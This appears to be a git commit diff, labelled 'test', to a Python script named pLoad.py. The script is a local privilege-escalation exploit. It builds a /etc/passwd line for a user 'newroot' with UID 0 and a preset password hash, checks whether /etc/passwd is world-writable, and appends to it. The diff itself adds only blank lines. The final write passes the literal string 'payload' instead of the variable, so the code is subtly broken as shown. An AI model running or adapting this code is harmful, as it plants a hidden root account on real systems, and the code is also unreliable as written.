7c17cda56f8dce0143fe26bd4f973ce65a9be56c
drac-0 <muhammadfaiz050607@gmail.com>
2026-09-20 07:02:29 +0800

    test

--- v0.1.2/pLoad.py
+++ v0.1.2/pLoad.py
@@ -1,6 +1,7 @@
 from os import environ
 from pathlib import Path
 
+
 shell = environ['SHELL']
 user = "newroot"
 pd = "$1$htf4psnX$PBKknYNMo2cq0bvOYtpt./"
@@ -8,6 +9,7 @@ payload = f"{user}:{pd}:0:0:root:/root:{shell}\n"
 file = Path("/etc/passwd")
 permission = file.stat().st_mode
 writable = permission & 0o002
+
 if (writable):
     with open("/etc/passwd", "a") as file:
         file.write("payload")
